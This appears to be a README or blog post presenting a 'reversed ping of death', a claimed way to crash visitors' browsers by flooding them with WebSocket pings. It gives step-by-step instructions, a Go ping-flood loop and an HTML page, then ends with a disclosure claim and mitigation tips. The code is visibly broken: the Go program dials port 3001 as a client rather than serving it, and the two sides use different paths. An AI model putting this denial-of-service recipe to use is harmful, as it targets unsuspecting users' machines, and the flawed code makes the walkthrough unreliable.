# websocket-reversed-ping-of-death

Warning: The following action may cause a visitor’s browser or even their computer to crash. This information is provided for educational purposes only. Use it responsibly.

I do not encourage or condone the misuse of this knowledge, and I disclaim any responsibility for any damage, disruption, or unintended consequences resulting from its use. Proceed at your own risk.

---

One of the first things someone learns in martial arts is that when you hold someone, that someone holds you too. If, for example, that someone falls on purpose while you’re holding them tightly, chances are you might fall too.

Even though there isn’t a special name for this idea, it can be found in Aiki martial arts principle, where the main point is that the opponent’s energy becomes a tool in your hands if you redirect it wisely.

When you write a program that handles WebSocket connections, one of the main security concerns is preventing a client from flooding you with messages or pings with bad intentions.

But what if I told you that, on the other side, no browser checks if you flood it with messages or pings in bad faith—and it just ends up crashing?

You can easily test this yourself:

1. Bookmark this page first, so you can return after a crash.
2. Write a Go program that opens a WebSocket connection and continuously sends pings in a highly repetitive loop:

main.go:
```
package main

import (
   "log"
   "time"
   "github.com/gorilla/websocket"
)

func main() {
   url := "ws://localhost:3001"
   conn, _, err := websocket.DefaultDialer.Dial(url, nil)
   if err != nil {
       log.Fatal("Error connecting to WebSocket:", err)
   }
   defer conn.Close()

   for {
       err := conn.WriteMessage(websocket.PingMessage, nil)
       if err != nil {
           log.Println("Error sending ping:", err)
           return
       }
   }
}
```

3. Write an HTML page that connects to this WebSocket connection:
index.html:
```
<!DOCTYPE html>
<html lang="en">
<head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>WebSocket Reversed Ping of Death</title>
</head>
<body>
   <h1>WebSocket Reversed Ping of Death</h1>

   <!-- - - -->

   <script>
       const socket = new WebSocket("ws://localhost:3001/ws");

       /*** * * ***/

       socket.onerror = (error) => {
           console.error("WebSocket error:", error);
       };

       socket.onopen = () => {
           console.log("WebSocket connected.");
       };

       socket.onclose = () => {
           console.log("WebSocket closed.");
       };

       socket.onmessage = (event) => {
           console.log("WebSocket received:", event.data);
       };
   </script>
</body>
</html>
```

4. Run the Go program:
```
go mod init main
go mod tidy
go run main.go
```

5. Start a simple HTTP server to serve index.html:
   (If port 3002 is not available, pick another one, e.g. 3003…)
```
python3 -m http.server 3002
```

6. Open the page in your browser. For example:
   (If port 3002 was not available, use the other one that you picked)
```
http://localhost:3002
```

Of course, the reason I’m writing these lines is not to enable script kiddies to annoy others, but to highlight a problem and propose a solution. Just to clarify, I am publishing this article only after having contacted major browser developers and submitted bug reports to ensure better client-side security checks for everyone.

Until all browsers implement a check, you can take care of your self, by :

1. If visiting a site crashed your computer, be aware that it’s possible and that it may be just this method above described used. Don’t panic and don’t believe everything.
2. If you develop an application that is depended on a third-party WebSocket, then a) check if you receive messages in an abnormal interval and b) connect through a proxy that checks if the connection is sending pings, pongs or any other exotic frame in an abnormal interval. A proxy is needed simply because browsers doesn’t expose such things to the applications.
